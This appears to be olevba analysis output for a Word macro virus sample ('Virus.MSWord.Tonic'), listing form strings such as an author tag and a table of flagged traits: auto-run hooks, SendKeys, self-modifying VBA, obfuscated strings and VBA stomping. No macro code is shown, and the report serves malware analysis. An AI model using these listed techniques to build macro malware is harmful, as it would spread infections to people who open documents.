-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tonic' - OLE stream: 'Macros/P4nd4/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Maaf bila mengganggu ...!?H
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tonic' - OLE stream: 'Macros/P4nd4/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MSgga
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tonic' - OLE stream: 'Macros/P4nd4/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�By J1nt0.PDW�

-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tonic' - OLE stream: 'Macros/P4nd4/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Romana
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tonic' - OLE stream: 'Macros/P4nd4/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Romana
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tonic' - OLE stream: 'Macros/P4nd4/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'L1'" IN './Virus.MSWord.Tonic' - OLE stream: 'Macros/P4nd4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN './Virus.MSWord.Tonic' - OLE stream: 'Macros/P4nd4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Love'" IN './Virus.MSWord.Tonic' - OLE stream: 'Macros/P4nd4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'L2'" IN './Virus.MSWord.Tonic' - OLE stream: 'Macros/P4nd4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Label1_Click        |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

